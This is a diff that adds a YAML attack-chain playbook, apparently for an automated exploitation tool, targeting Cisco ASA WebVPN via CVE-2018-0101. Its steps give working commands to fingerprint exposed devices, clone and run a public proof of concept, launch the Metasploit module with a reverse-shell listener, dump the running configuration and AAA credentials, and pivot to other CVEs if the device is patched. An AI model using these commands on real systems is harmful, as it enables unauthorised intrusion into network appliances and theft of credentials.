@@ -1,0 +1,64 @@
+chain_id: cisco_asa_webvpn_cve_2018_0101
+title: "Cisco ASA WebVPN — CVE-2018-0101 unauth RCE via XML SOAP double-free"
+severity: CRITICAL
+tags: [web, cisco, asa, webvpn, cve-2018-0101, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2018-0101" }
+    - { banner_pattern: "(?i)cisco\\s*asa|asdm" }
+    - { product_pattern: "(?i)cisco\\s*asa" }
+    - { path_pattern: "(?i)/\\+CSCOE\\+/|/\\+webvpn\\+/" }
+
+description: |
+  Cisco ASA / Firepower Threat Defense with WebVPN or AnyConnect IKEv2
+  enabled (8.x → 9.9.x): a malformed XML in the WebVPN SOAP handler
+  causes a double-free that survives the crash, giving an unauth
+  attacker code execution as the device. Cisco's "highest-severity-
+  ever" advisory at the time. Mass-exploitable: just a single TCP
+  POST.
+
+steps:
+  - id: 1
+    title: "Confirm WebVPN is exposed"
+    command: |
+      curl -sk -I "https://$VICTIMA/+CSCOE+/logon.html" | head -3
+      curl -sk "https://$VICTIMA/+webvpn+/index.html" -I
+
+  - id: 2
+    title: "Fingerprint version (response leaks ASA version)"
+    command: |
+      curl -sk "https://$VICTIMA/+CSCOE+/logon.html?fcadbadd=1" | grep -Eo 'asa[0-9._]+' | head
+
+  - id: 3
+    title: "Public PoC"
+    command: |
+      git clone https://github.com/Yt1g3r/CVE-2018-0101_EXP /tmp/asa
+      python3 /tmp/asa/CVE-2018-0101.py $VICTIMA 443
+
+  - id: 4
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/linux/http/cisco_asa_webvpn_rce_cve_2018_0101; \
+        set RHOSTS $VICTIMA; set RPORT 443; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 5
+    title: "Post — running config + AAA cleartext creds"
+    command: |
+      # On the ASA shell after exploit:
+      show running-config
+      show running-config | include aaa-server
+      show vpn-sessiondb anyconnect
+
+common_errors:
+  - error: "Crash but no callback (post-patch)"
+    solution: |
+      ASA 9.x patch series fix is robust — exploit is a brick now.
+      Pivot to CVE-2020-3580 (also WebVPN, XSS-only) or
+      CVE-2023-20269 (auth bypass to LDAP attribute brute) on the
+      same management plane.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2018-0101
+  - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180129-asa1
